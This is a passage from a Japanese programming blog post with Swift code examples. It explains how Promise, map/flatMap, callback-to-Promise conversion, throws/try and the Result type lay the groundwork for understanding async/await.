<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nv">numbers</span><span class="p">:</span> <span class="nb">Array</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">]</span>
<span class="kd">let</span> <span class="nv">squares</span><span class="p">:</span> <span class="nb">Array</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">numbers</span><span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="nv">$0</span> <span class="o">*</span> <span class="nv">$0</span> <span class="p">}</span> <span class="c1">// [4, 9, 25]</span>
</pre></div></div>

<p><code>Optional</code> でも同じです。 <code>map</code> メソッドを使って、値がある場合は 2 乗し、 <code>nil</code> の場合は <code>nil</code> のままとすることができます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nv">number</span><span class="p">:</span> <span class="nb">Optional</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">=</span> <span class="mi">3</span>
<span class="kd">let</span> <span class="nv">square</span><span class="p">:</span> <span class="nb">Optional</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">number</span><span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="nv">$0</span> <span class="o">*</span> <span class="nv">$0</span> <span class="p">}</span> <span class="c1">// Optional(9)</span>
</pre></div></div>

<p><code>Optional</code> は値が入っているかもしれないし、入っていないかもしれない箱だと考えられます。 <code>Optional&lt;Int&gt;</code> ( <code>Int?</code> ) なら <code>Int</code> が入っているかもしれないし、入っていない（ <code>nil</code> ）かもしれないわけです。</p>

<p><code>Promise</code> も同じように箱だと考えられます。 <code>Promise</code> はどんな箱かというと、今はまだ手に入っていないけれども将来値が手に入る箱です。それなら、同じように <code>map</code> を使って将来手に入る値を 2 乗することができてもおかしくありません。</p>

<p><code>Promise</code> を使って将来手に入る値を 2 乗するコードは次のようになります。 <code>Array</code> や <code>Optional</code> とまったく同じなのがわかると思います。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nv">number</span><span class="p">:</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">downloadInt</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span>
<span class="kd">let</span> <span class="nv">square</span><span class="p">:</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">number</span><span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="nv">$0</span> <span class="o">*</span> <span class="nv">$0</span> <span class="p">}</span>
</pre></div></div>

<p>この場合、 <code>number</code> に <code>get</code> して将来得られる値が <code>3</code> だとすると、 <code>square</code> に <code>get</code> して将来得られる値は <code>9</code> となります。</p>

<p>このようにして、 <code>Promise</code> の <code>map</code> メソッドを使えば <strong>今はまだ手に入っていない将来の値に対して操作を加えることができます</strong>。</p>

<h3>
<span id="flatmap" class="fragment"></span><a href="#flatmap"><i class="fa fa-link"></i></a><code>flatMap</code>
</h3>

<p><code>Promise</code> にとってより重要なのが <code>flatMap</code> です。</p>

<p><code>Promise</code> の <code>flatMap</code> を考える前に、まず <code>Optional</code> の <code>flatMap</code> <a href="https://developer.apple.com/documentation/swift/optional/1540500-flatmap" rel="nofollow noopener" target="_blank">(API Reference)</a> についておさらいしましょう。</p>

<p>たとえば、 <code>[String: String]</code> から値を取り出し、得られた <code>String</code> を整数に変換したいとします。 Web アプリで GET パラメータを処理する場合などにありがちです。この場合、 <code>parameters["id"]</code> 等で得られる値は <code>String</code> ではなく <code>String?</code> です。また、 <code>String</code> を <code>Int</code> に変換する処理も、パースに失敗すると <code>nil</code> となるので <code>Int?</code> が返されます。</p>

<p>これを単純に結合すると <code>Optional</code> がネストして <code>Optional&lt;Optional&lt;Int&gt;</code> ( <code>Int??</code> ) になってしまします。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nv">idString</span><span class="p">:</span> <span class="nb">Optional</span><span class="p">&lt;</span><span class="nb">String</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">parameters</span><span class="p">[</span><span class="s">"id"</span><span class="p">]</span>
<span class="kd">let</span> <span class="nv">id</span> <span class="p">=</span> <span class="n">idString</span><span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="nb">Int</span><span class="p">(</span><span class="nv">$0</span><span class="p">)</span> <span class="p">}</span> <span class="c1">// `id` の型は `Optional&lt;Optional&lt;Int&gt;&gt;`</span>
</pre></div></div>

<p>今求めているのは、 <code>parameters["id"]</code> か <code>Int($0)</code> のどちらかに失敗すると <code>nil</code> になり、両方に成功した場合には <code>Int</code> の <code>id</code> が得られることです。つまり、結果としてほしい値の型は <code>Optional&lt;Int&gt;</code> です。しかし、先程のコードでは <code>Optional&lt;Optional&lt;Int&gt;&gt;</code> のようにネストしてしまいました。そんなときに役に立つのが <code>flatMap</code> です。</p>

<p><code>map</code> の代わりに <code>flatMap</code> を使うと、ネストした <code>Optional</code> をつぶしてフラット（一重）にしてくれます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nv">idString</span><span class="p">:</span> <span class="nb">Optional</span><span class="p">&lt;</span><span class="nb">String</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">parameters</span><span class="p">[</span><span class="s">"id"</span><span class="p">]</span>
<span class="kd">let</span> <span class="nv">id</span><span class="p">:</span> <span class="nb">Optional</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">idString</span><span class="p">.</span><span class="n">flatMap</span> <span class="p">{</span> <span class="nb">Int</span><span class="p">(</span><span class="nv">$0</span><span class="p">)</span> <span class="p">}</span>

</pre></div></div>

<p>これは <code>parameters["id"]</code> と <code>Int($0)</code> という二つの失敗し得る処理を結合したとも考えられます。失敗しうる処理が結合されると、どちらか一方でも失敗したら <code>nil</code> になり、両方に成功した場合だけ結果が得られるわけです。</p>

<p>同じことが <code>Promise</code> でも言えます。まずダウンロード先の <code>URL</code> をダウンロードし、それを使って <code>id</code> をダウンロードする二つの非同期処理を次のように <code>flatMap</code> で結合できます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nv">idURL</span><span class="p">:</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="n">URL</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">downloadURL</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span>
<span class="kd">let</span> <span class="nv">id</span><span class="p">:</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">idURL</span><span class="p">.</span><span class="n">flatMap</span> <span class="p">{</span> <span class="n">downloadInt</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="nv">$0</span><span class="p">)</span> <span class="p">}</span>
</pre></div></div>

<p><code>Optional</code> を <code>flatMap</code> で結合すると両方に成功した場合だけ値が得られました。 <code>Promise</code> では両方の非同期処理を順番に実行し、両方とも完了したときに初めて値が得られる <code>Promise</code> が得られます。</p>

<p>次のようにして <code>flatMap</code> を使うことで非同期処理を結合することができます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nv">idURL</span><span class="p">:</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="n">URL</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">downloadURL</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span>
<span class="kd">let</span> <span class="nv">id</span><span class="p">:</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">idURL</span><span class="p">.</span><span class="n">flatMap</span> <span class="p">{</span> <span class="n">downloadInt</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="nv">$0</span><span class="p">)</span> <span class="p">}</span>

<span class="n">id</span><span class="p">.</span><span class="kr">get</span> <span class="p">{</span> <span class="p">(</span><span class="n">id</span><span class="p">:</span> <span class="nb">Int</span><span class="p">)</span> <span class="k">in</span>
  <span class="c1">// `downloadURL` がまず実行され、次に `downloadInt` が実行され、</span>
  <span class="c1">// 両方の非同期処理が完了したときに初めてこのクロージャが実行される。</span>
<span class="p">}</span>
</pre></div></div>

<p>では、これを使って先程のコールバック地獄を解消してみましょう。先程挙げた↓のコールバック地獄ですが、</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nf">downloadFooImage</span><span class="p">(</span><span class="n">callback</span><span class="p">:</span> <span class="p">@</span><span class="n">escaping</span> <span class="p">(</span><span class="n">Image</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="p">())</span> <span class="p">{</span>
  <span class="n">downloadServerURL</span><span class="p">()</span> <span class="p">{</span> <span class="n">url</span> <span class="k">in</span>
    <span class="n">downloadJSON</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span> <span class="p">{</span> <span class="n">json</span> <span class="k">in</span>
      <span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">json</span><span class="p">[</span><span class="s">"foo"</span><span class="p">][</span><span class="s">"image"</span><span class="p">][</span><span class="s">"url"</span><span class="p">].</span><span class="n">string</span><span class="p">!</span> <span class="p">)</span> <span class="p">{</span> <span class="n">imageData</span> <span class="k">in</span>
        <span class="n">callback</span><span class="p">(</span><span class="n">Image</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="n">imageData</span><span class="p">)</span><span class="o">!</span><span class="p">)</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>コールバックの部分がすべて <code>Promise</code> なら↓のように <code>flatMap</code> の連結で書けます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nf">downloadFooImage</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="n">Image</span><span class="p">&gt;</span> <span class="p">{</span>
  <span class="k">return</span> <span class="n">downloadServerURL</span><span class="p">().</span><span class="n">flatMap</span> <span class="p">{</span> <span class="n">url</span> <span class="k">in</span>
    <span class="n">downloadJSON</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span>
  <span class="p">}.</span><span class="n">flatMap</span> <span class="p">{</span> <span class="n">json</span> <span class="k">in</span>
    <span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">json</span><span class="p">[</span><span class="s">"foo"</span><span class="p">][</span><span class="s">"image"</span><span class="p">][</span><span class="s">"url"</span><span class="p">].</span><span class="n">string</span><span class="p">!</span> <span class="p">)</span>
  <span class="p">}.</span><span class="bp">map</span> <span class="p">{</span> <span class="n">imageData</span> <span class="k">in</span>
    <span class="n">Image</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="n">imageData</span><span class="p">)</span><span class="o">!</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>これがわかりやすいかどうかは人によると思います。ネストが深くてもコールバックの方が読みやすいという人も当然いると思います。</p>

<p>それでは、なぜこんなにも延々と <code>Promise</code> と <code>flatMap</code> の話をしているのかと言うと、 <code>async</code> は <code>Promise</code> を <code>return</code> することに、 <code>await</code> は <code>flatMap</code> に対応するからです。</p>

<p><code>Promise</code> を知っていると <code>async/await</code> がどういうものなのか格段に理解しやすくなります。</p>

<h3>
<span id="コールバックの-promise-化" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%AB%E3%83%90%E3%83%83%E3%82%AF%E3%81%AE-promise-%E5%8C%96"><i class="fa fa-link"></i></a>コールバックの <code>Promise</code> 化</h3>

<p>さて、ここまでの話は <code>Promise</code> のレベル 1 で、ここからがレベル 2 です。これまでは <code>Promise</code> 化された API をどのように使うかについてで、ここからは自分で <code>Promise</code> 化された API を作る話です。</p>

<p>ちなみに、レベル 3 は自分で <code>Promise</code> を作る話です。今日のテーマには含まれませんが、すごく勉強になるので <code>Promise</code> を実装してみることをオススメします。</p>

<p><code>Promise</code> がおもしろいのは、並行処理の仕組みそのものとは独立していることです。 iOS アプリ開発であれば、 GCD や Foundation の <code>Thread</code> など様々な方法で並行処理を実現できます。 <code>Promise</code> はそれらと組み合わせて利用することができます。また、コールバックで実装された既存のメソッド（ <code>UIView.animate(...)</code> 等）を <code>Promise</code> 化することもできます。</p>

<p>たとえば、 <code>func foo(_ completion: (Int) -&gt; ())</code> というコールバックで結果を受け取る関数があったとして、これを <code>Promise</code> 化したものは次のように実装できます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nf">promisedFoo</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">{</span>
  <span class="k">return</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">{</span> <span class="n">fulfill</span> <span class="k">in</span>
    <span class="n">foo</span> <span class="p">{</span> <span class="n">fulfill</span><span class="p">(</span><span class="nv">$0</span><span class="p">)</span> <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>ちょっと複雑ですが何をしているのが順に見ていきましょう。まず、 <code>Promise</code> のイニシャライザのシグネチャは次のようになっています。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">init</span><span class="p">(</span><span class="kc">_</span> <span class="n">executor</span><span class="p">:</span> <span class="p">(</span><span class="kc">_</span> <span class="n">fulfill</span><span class="p">:</span> <span class="p">@</span><span class="n">escaping</span> <span class="p">(</span><span class="n">Value</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="p">())</span> <span class="p">-&gt;</span> <span class="p">())</span>
</pre></div></div>

<p><code>Promise</code> は生まれた直後には値を持っていませんが、いつかは非同期処理が終わって値を手に入れなければなりません。 <code>Promise</code> に値を通知する手段を提供するのが <code>fulfill</code> です。　<code>Promise&lt;Foo&gt;</code> のとき、 <code>fulfill</code> は <code>(Foo) -&gt; ()</code> という型の関数です。 <code>fulfill</code> の引数に <code>Foo</code> 型を与えて呼び出せば <code>Promise</code> の非同期処理は完了し <code>Foo</code> が得られたことを意味します。</p>

<p>極端な話、↓のようにすれば即時に値が手に入る <code>Promise</code> を作ることもできます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="n">Promise</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">{</span> <span class="n">fulfill</span> <span class="k">in</span>
  <span class="n">fulfill</span><span class="p">(</span><span class="mi">42</span><span class="p">)</span>
<span class="p">}</span>
</pre></div></div>

<p>先の例では、このクロージャ式の中で非同期処理 <code>foo</code> を呼び出し、コールバックの中で <code>fulfill</code> を呼び出すことでコールバックを <code>Promise</code> 化しているわけです。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="n">Promise</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">{</span> <span class="n">fulfill</span> <span class="k">in</span>
  <span class="n">foo</span> <span class="p">{</span> <span class="n">fulfill</span><span class="p">(</span><span class="nv">$0</span><span class="p">)</span> <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>この仕組みを使えば、任意の非同期処理を <code>Promise</code> 化することが可能です。後でもう一度触れますが、この <code>Promise</code> のイニシャライザは <code>async/await</code> の Proposal 中の <code>suspendAsync</code> に相当します。</p>

<p>また、 <code>async/await</code> の話と直接関係ないですが、僕が <code>Promise</code> についておもしろいと思うのは、それそのものが状態でできているような存在なのに、イミュータブルのように振る舞う点です。 <code>Promise</code> を使う側はすでに非同期処理が終わって値が決定されているのかを気にする必要はないですし、一度決定された値が後で変更されることもありません。何度 <code>get</code> しても同じ値が得られます。 <code>get</code> や <code>map</code>, <code>flatMap</code> に渡した関数がいつ呼ばれるかがわからないだけで、得られる値は常に一つです。状態変化を扱うのにそれを内部に隠蔽し、利用者はイミュータブルなコードを書けるというのが <code>Promise</code> のおもしろいところです。</p>

<p>さらに余談ですが、この <code>Promise</code> の実装は<a href="https://github.com/koher/PromiseK/blob/dev-3.0/Sources/PromiseK/Promise.swift" rel="nofollow noopener" target="_blank">ここ</a> にあります。実質的にはわずか 38 行のコードです。これは、僕がこれまでに Swift で書いた最もキレイなコードの一つだと思うので、良かったら見てみて下さい。</p>

<h2>
<span id="throwstry" class="fragment"></span><a href="#throwstry"><i class="fa fa-link"></i></a><code>throws/try</code>
</h2>

<p>さて、 Swift 1 から少し時代が進んで、 2015 年の夏に Swift 2.0 がリリースされました。 Swift 2.0 で最も注目すべきだったのは何と言っても <code>throws/try</code> です。なぜここで突然 <code>throws/try</code> の話を始めたかと言うと、 <code>throws/try</code> が <code>async/await</code> ととても良く似た仕組みの上に成り立っているからです。</p>

<p>Swift 1 時代には <code>Optional</code> を返すことで失敗し得る処理を扱うことができました。しかし、 <code>nil</code> ではエラーの理由を表すことができないので、色々な理由でエラーが起こり得る場合には不便です。特に、エラーの原因によって処理を分けることは <code>Optional</code> では不可能です。また、 Obj-C 由来の <code>NSError</code> の扱いも Swift 1 時代は大変でした。</p>

<p>Swift 2.0 からは、 <code>throws/try</code> を使うことによってエレガントにエラー処理をすることができるようになりました。</p>

<p>Swift の <code>throws/try</code> は Java の検査例外とよく似ているのですが、そのまま持ってきたのではなく Swift にフィットするようによく考えて変更されています。 "SwiftはどのようにJavaの検査例外を改善したか" については<a href="https://qiita.com/koher/items/e4c1d88981291c35d571" id="reference-a52c2fe5d8e0d36d8cbf">こちらの投稿</a>にまとめてあります。この投稿はあまり伸びませんでしたが、個人的にはとてもおもしろいことが書いてあると思うのでよかったら読んでみて下さい。</p>

<p><code>throws/try</code> を使えば失敗し得る処理を次のように書けます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nf">loadFoo</span><span class="p">()</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="n">Foo</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>

<span class="k">do</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nv">foo</span><span class="p">:</span> <span class="n">Foo</span> <span class="p">=</span> <span class="k">try</span> <span class="n">loadFoo</span><span class="p">()</span>
  <span class="c1">// `foo` を使う処理</span>
<span class="p">}</span> <span class="k">catch</span> <span class="n">error</span> <span class="p">{</span>
  <span class="c1">// エラー処理</span>
<span class="p">}</span>
</pre></div></div>

<p>この <code>throws/try</code> の仕組自体は僕はとても素晴らしいと感じていますが、一つ大きな問題があります。それが、非同期処理と組み合わせて使いづらいことです。</p>

<p>たとえば、これまで <code>download</code> 関数が失敗する可能性を無視してきましたが、現実的にはダウンロードは失敗し得る処理です。しかし、 <code>download</code> に <code>throws</code> を付けることはできません。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// コールバック（これではダメ⛔）</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">,</span> <span class="n">completion</span><span class="p">:</span> <span class="p">@</span><span class="n">escaping</span> <span class="p">(</span><span class="n">Data</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="p">())</span> <span class="kr">throws</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>

<span class="c1">// Promise （これもダメ⛔）</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">)</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="n">Data</span><span class="p">&gt;</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
</pre></div></div>

<p>なぜなら、 <code>throws</code> によるエラーは関数のコールに対して同期的に対処しなければならないからです。しかし、ダウンロード中のエラーは非同期に発生するので、同期的に処理することはできません。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="k">do</span> <span class="p">{</span>
  <span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span> <span class="p">{</span> <span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="n">Data</span><span class="p">)</span> <span class="k">in</span>
    <span class="c1">// 本当はここでエラー処理したい</span>
  <span class="p">}</span>
<span class="p">}</span> <span class="k">catch</span> <span class="kd">let</span> <span class="nv">error</span> <span class="p">{</span>
  <span class="c1">// ここでエラー処理したいわけではない</span>
<span class="p">}</span>
</pre></div></div>

<p>↓のようにすれば無理やりコールバックや <code>Promise</code> でエラー処理させることができますがちょっと辛いです。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// コールバック（一応できるがわかりづらい🤔）</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">,</span> <span class="n">completion</span><span class="p">:</span> <span class="p">@</span><span class="n">escaping</span> <span class="p">(()</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="n">Data</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="p">())</span> <span class="kr">throws</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>

<span class="c1">// Promise （これもできるがわかりづらい🤔）</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">)</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="n">Promise</span><span class="o">&lt;</span><span class="p">()</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="n">Data</span><span class="p">&gt;</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
</pre></div></div>

<p>これを使うコードは↓です。クロージャで受け取るのが値（ <code>data</code> ）ではなく関数（ <code>getData</code> ）という点がわかりづらいです。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span> <span class="p">{</span> <span class="n">getData</span> <span class="k">in</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nv">data</span> <span class="p">=</span> <span class="k">try</span> <span class="n">getData</span><span class="p">()</span>
    <span class="c1">// `data` を使う処理</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="kd">let</span> <span class="nv">error</span> <span class="p">{</span>
    <span class="c1">// エラー処理</span>
  <span class="p">}</span>
<span class="p">}</span>

</pre></div></div>

<h2>
<span id="result" class="fragment"></span><a href="#result"><i class="fa fa-link"></i></a><code>Result</code>
</h2>

<p><code>throws/try</code> は非同期処理と相性が悪いということで <code>Result</code> ライブラリが流行りました。一番有名なのは <a href="https://github.com/antitypical/Result" rel="nofollow noopener" target="_blank">antitypical/Result</a> です。しかし、ここでは話の都合上、僕が実装した <a href="https://github.com/koher/ResultK" rel="nofollow noopener" target="_blank">ResultK</a> を使って説明します。</p>

<p>antitypical/Result と ResultK の一番の違いは、前者が <code>Result&lt;T, E: Error&gt;</code> と型パラメータでエラーの型を指定できるのに対して、後者は <code>Result&lt;T&gt;</code> とエラーの型が指定できないことです。 Swift の <code>throws</code> 節には Java のようにエラーの型を指定することができません。そのため、エラーの型が指定できない <code>Result</code> の方が <code>throws/try</code> にキレイに対応します。それが ResultK で説明する理由です。</p>

<p><code>Result</code> は次のように宣言されています。成功して <code>T</code> 型の値を持つか、失敗して <code>Error</code> を持つかのどちらかであることを表す型です。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">enum</span> <span class="nc">Result</span><span class="p">&lt;</span><span class="n">T</span><span class="p">&gt;</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">success</span><span class="p">(</span><span class="n">T</span><span class="p">)</span>
    <span class="k">case</span> <span class="n">failure</span><span class="p">(</span><span class="n">Error</span><span class="p">)</span>
<span class="p">}</span>
</pre></div></div>

<p><code>Result</code> を使えば <code>throws</code> で書かれた関数を↓のように書き換えることができます。 <code>throws</code> を付与するのと <code>Result</code> を <code>return</code> するのが対応していることに注目して下さい。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// throws/try</span>
<span class="kd">func</span> <span class="nf">loadFoo</span><span class="p">()</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="n">Foo</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>

<span class="c1">// Result</span>
<span class="kd">func</span> <span class="nf">loadFoo</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">Result</span><span class="p">&lt;</span><span class="n">Foo</span><span class="p">&gt;</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
</pre></div></div>

<p><code>Result</code> は <code>enum</code> なので、↓のようにしてエラー処理することができます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="k">switch</span> <span class="p">(</span><span class="n">loadFoo</span><span class="p">())</span> <span class="p">{</span>
<span class="k">case</span> <span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="kd">let</span> <span class="nv">foo</span><span class="p">)</span>
  <span class="c1">// `foo` を使う処理</span>
<span class="k">case</span> <span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="kd">let</span> <span class="nv">error</span><span class="p">)</span>
  <span class="c1">// エラー処理</span>
<span class="p">}</span>
</pre></div></div>

<p><code>Result</code> を使ってうれしいのは非同期処理と組み合わせたときです。 <code>Result</code> があれば先程の <code>download</code> は次のように書けます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// コールバック（非同期処理の結果が `Result&lt;Data&gt;` で得られるのでわかりやすい✅）</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">,</span> <span class="n">completion</span><span class="p">:</span> <span class="p">@</span><span class="n">escaping</span> <span class="p">(</span><span class="n">Result</span><span class="p">&lt;</span><span class="n">Data</span><span class="p">&gt;)</span> <span class="p">-&gt;</span> <span class="p">())</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>

<span class="c1">// Promise （非同期処理の結果が `Result&lt;Data&gt;` で得られるのでわかりやすい✅）</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="n">Result</span><span class="p">&lt;</span><span class="n">Data</span><span class="p">&gt;</span><span class="o">&gt;</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
</pre></div></div>

<h3>
<span id="map-flatmap" class="fragment"></span><a href="#map-flatmap"><i class="fa fa-link"></i></a><code>map</code>, <code>flatMap</code>
</h3>

<p><code>Result</code> もモナドなので、 <code>Optional</code> や <code>Promise</code> と同じく <code>map</code> や <code>flatMap</code> を持ちます。</p>

<p>たとえば、 <code>map</code> を使って <code>Result</code> の中身を 2 乗するコードは↓のようになります。　<code>Optional</code> や <code>Promise</code> のときとまったく同じですね。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nv">number</span><span class="p">:</span> <span class="n">Result</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">loadInt</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">path</span><span class="p">)</span>
<span class="kd">let</span> <span class="nv">square</span><span class="p">:</span> <span class="n">Result</span><span class="p">&lt;</span><span class="nb">Int</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">number</span><span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="nv">$0</span> <span class="o">*</span> <span class="nv">$0</span> <span class="p">}</span>
</pre></div></div>

<p><code>flatMap</code> も同様です。 <code>Optional</code> のときと同じように、 <code>flatMap</code> を使って失敗し得る処理を結合することができます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nv">json</span><span class="p">:</span> <span class="n">Result</span><span class="p">&lt;</span><span class="n">Data</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">loadData</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">path</span><span class="p">)</span>
<span class="kd">let</span> <span class="nv">user</span><span class="p">:</span> <span class="n">Result</span><span class="p">&lt;</span><span class="n">User</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">json</span><span class="p">.</span><span class="n">flatMap</span> <span class="p">{</span> <span class="n">decodeUser</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="nv">$0</span><span class="p">)</span> <span class="p">}</span>
</pre></div></div>

<p>この処理では、まず JSON ファイルからデータを読み込み、次の読み込まれたデータを <code>User</code> 型の値にデコードしています。どちらも失敗しうる処理であり、 <code>flatMap</code> で結合して両方に成功した場合だけ <code>User</code> が得られます。</p>

<h3>
